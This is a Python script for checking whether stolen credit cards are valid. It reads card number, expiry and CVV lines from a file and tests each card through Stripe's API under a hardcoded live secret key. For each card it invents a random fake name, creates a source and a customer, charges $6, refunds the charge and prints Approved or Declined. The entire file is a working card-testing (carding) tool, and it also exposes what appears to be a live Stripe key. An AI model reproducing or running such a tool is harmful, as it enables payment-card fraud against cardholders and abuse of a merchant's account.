import requests
import names

def error_parse(cc, month, year, cvv, response_json):
    if any(keyword in str(response_json) for keyword in [
        'incorrect_cvc', 'invalid_account', 'incorrect_number', 
        'do_not_honor', 'lost_card', 'stolen_card', 
        'transaction_not_allowed', 'pickup_card', 'Your card has expired',
        'processing_error', 'service_not_allowed', 'insufficient_funds', 
        'fraudulent', 'Your card number is incorrect', 'invalid_expiry_month', 
        'invalid_expiry_year', 'invalid_cvc', 'card_declined', 'generic_decline', 
        'unchecked'
    ]):
        print(f'{cc}|{month}|{year}|{cvv} - Declined')
    else:
        print(f'{cc}|{month}|{year}|{cvv} - Declined ( Other Error )')

def success_parse(cc, month, year, cvv, response_json):
    if 'Payment Complete.' in response_json.get('outcome', {}).get('seller_message', ''):
        print(f'Approved: {cc}|{month}|{year}|{cvv}')
    else:
        print(f'{cc}|{month}|{year}|{cvv} - Approved ( Other )')

def check(sk, combos):
    cc, month, year, cvv = combos.split('|')
    name, last = names.get_full_name().split(' ')

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    

    data_source = f'type=card&owner[name]={name}&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}'
    response_source = requests.post('https://api.stripe.com/v1/sources', headers=headers, data=data_source, auth=(sk, '')).json()
    if 'id' not in response_source:
        error_parse(cc, month, year, cvv, response_source)
        return False

    token_source = response_source['id']


    data_customer = f'description={name} {last}&source={token_source}'
    response_customer = requests.post('https://api.stripe.com/v1/customers', headers=headers, data=data_customer, auth=(sk, '')).json()
    if 'id' not in response_customer:
        error_parse(cc, month, year, cvv, response_customer)
        return False

    token_customer = response_customer['id']


    data_charges = f'amount=600&currency=usd&customer={token_customer}'
    response_charges = requests.post('https://api.stripe.com/v1/charges', headers=headers, data=data_charges, auth=(sk, '')).json()
    if 'id' in response_charges:
        success_parse(cc, month, year, cvv, response_charges)
    else:
        error_parse(cc, month, year, cvv, response_charges)
        return False
    
 
    data_refunds = f'charge={response_charges.get("id", "")}'
    response_refunds = requests.post('https://api.stripe.com/v1/refunds', headers=headers, data=data_refunds, auth=(sk, '')).json()


sk_keys = [
    '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'
]

with open('soul.txt', 'r') as file:
    lines = file.readlines()

for i, line in enumerate(lines):
    combos = line.strip()
    sk = sk_keys[i % len(sk_keys)]
    check(sk, combos)